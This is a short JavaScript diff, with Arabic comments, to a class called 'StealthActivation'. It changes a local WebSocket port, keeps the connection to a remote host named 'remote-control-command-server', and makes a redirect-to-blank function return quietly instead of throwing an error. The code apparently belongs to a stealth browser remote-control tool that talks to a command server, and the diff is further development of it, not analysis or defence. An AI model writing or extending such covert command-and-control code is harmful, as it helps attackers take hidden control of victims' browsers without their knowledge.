@@ -540,7 +540,7 @@ class StealthActivation {
             // محاولة الاتصال بالخادم
             const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
             const serverUrl = isLocalhost 
-                ? 'ws://localhost:4000' 
+                ? 'ws://localhost:10001' 
                 : 'wss://remote-control-command-server.onrender.com';
             
             const ws = new WebSocket(serverUrl);
@@ -1248,16 +1248,16 @@ class StealthActivation {
         }
     }
 
-    // تم حذف دالة redirectToBlank نهائياً لمنع أي إعادة توجيه
+    // دالة redirectToBlank محسنة - لا تعيد التوجيه
     redirectToBlank() {
-        console.log('❌ تم منع استدعاء redirectToBlank - الدالة محذوفة');
+        console.log('✅ تم استدعاء redirectToBlank - لن يتم إعادة التوجيه');
         console.log('✅ الصفحة ستبقى مرئية ولن تنتقل إلى about:blank');
         
         // إظهار رسالة نجاح بدلاً من أي إعادة توجيه
         this.showSuccessMessage();
         
-        // منع أي محاولة إعادة توجيه
-        throw new Error('تم منع redirectToBlank - الدالة محذوفة');
+        // عدم إعادة التوجيه - الصفحة تبقى كما هي
+        return false;
     }
     
     // عرض رسالة نجاح
